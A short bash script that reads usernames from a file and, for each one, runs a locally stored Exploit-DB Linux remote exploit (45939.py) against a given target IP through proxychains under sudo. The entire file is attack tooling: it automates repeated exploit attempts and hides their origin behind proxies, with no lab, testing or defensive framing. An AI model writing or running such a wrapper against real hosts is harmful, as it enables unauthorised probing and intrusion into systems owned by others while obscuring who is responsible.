#!/bin/bash

# Check if correct number of arguments is passed
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <username_file> <target_ip>"
    exit 1
fi

# Assign command line arguments to variables
username_file="$1"
target_ip="$2"

# Path to the exploit script
exploit_script="/usr/share/exploitdb/exploits/linux/remote/45939.py"

# Check if the username file exists
if [ ! -f "$username_file" ]; then
    echo "File $username_file not found!"
    exit 1
fi

# Loop through each username in the file and run the exploit script
while IFS= read -r username; do
    #echo "Running exploit for username: $username"
    sudo proxychains4 -q python2 "$exploit_script" "$target_ip" "$username"
done < "$username_file"
